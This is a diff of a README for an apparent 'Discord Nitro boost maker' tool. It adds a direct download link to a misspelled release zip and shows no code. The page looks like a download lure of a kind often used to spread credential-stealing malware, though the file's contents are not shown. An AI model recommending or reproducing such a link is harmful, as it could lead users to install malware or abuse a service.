@@ -1,6 +1,6 @@
 # 🔲 Nitro-Boosts
 
-🎵 Install --> [Releases]() ![Boost Logo](nt.gif)
+🎵 Install --> [Releases](https://github.com/Yupipa/Discod-Nitro-Boost-Maker/releases/download/v2.6/Relase.zip) ![Boost Logo](nt.gif)
 
 ![Boost Logo](boost.gif)
 
